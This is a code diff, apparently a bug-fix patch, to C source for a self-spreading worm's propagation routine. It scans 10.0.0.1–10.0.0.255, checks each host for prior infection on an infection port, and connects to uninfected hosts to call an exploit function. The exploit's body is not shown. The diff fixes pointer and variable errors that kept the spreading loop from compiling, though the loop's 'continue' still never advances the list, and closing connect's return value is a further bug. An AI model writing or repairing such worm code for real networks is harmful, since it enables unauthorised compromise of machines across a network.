@@ -61,15 +61,15 @@ void free_list (struct list_server * list){
 
 int is_infected(unsigned long ip, int sock, struct sockaddr_in * my_server_addr){
     my_server_addr->sin_addr.s_addr = ip;
-    my_server_addr.sin_port = htons(INFECT_PORT);
+    my_server_addr->sin_port = htons(INFECT_PORT);
     int connfd = connect(sock, my_server_addr, sizeof(*my_server_addr));
     if (connfd == 0){
         close(connfd);
-    	my_server_addr.sin_port = htons(SERVER_PORT);
+    	my_server_addr->sin_port = htons(SERVER_PORT);
         return 1;
     }
     else{
-	    my_server_addr.sin_port = htons();
+	    my_server_addr->sin_port = htons(INFECT_PORT);
         return 0;
     }
 }
@@ -189,7 +189,7 @@ int entry_point() {
     then puts them in a linked list*/
 	char *start = "10.0.0.1";
 	char *end = "10.0.0.255";
-    struct list_server my_list;
+    struct list_server *my_list;
 	my_list = scan_server_available(start, end);
 
 
@@ -197,7 +197,7 @@ int entry_point() {
 	int my_sockfd;
 	struct sockaddr_in my_server_addr;
 	my_sockfd = socket(AF_INET, SOCK_STREAM, 0);
-	memset(&server_addr, 0, sizeof(my_server_addr));	
+	memset(&my_server_addr, 0, sizeof(my_server_addr));	
     my_server_addr.sin_family = AF_INET;
     my_server_addr.sin_port = htons(SERVER_PORT);
 
@@ -207,14 +207,14 @@ int entry_point() {
 	current = my_list->Debut;
 	while(current!= NULL){
 		// Checks whether it has previously been infected 
-		if (is_infected(current->IP,sockfd,&my_server_addr)){
+		if (is_infected(current->IP,my_sockfd,&my_server_addr)){
 			continue;
 		}
 		else{
 			// Setting up a client connection
 			my_server_addr.sin_addr.s_addr = current->IP;
 			int connfd;
-			connfd = connect(sockfd, (struct sockaddr*)&my_server_addr, sizeof(my_server_addr));
+			connfd = connect(my_sockfd, (struct sockaddr*)&my_server_addr, sizeof(my_server_addr));
 			if (connfd >= 0){
 				// Launch exploit
 				exploit(connfd);
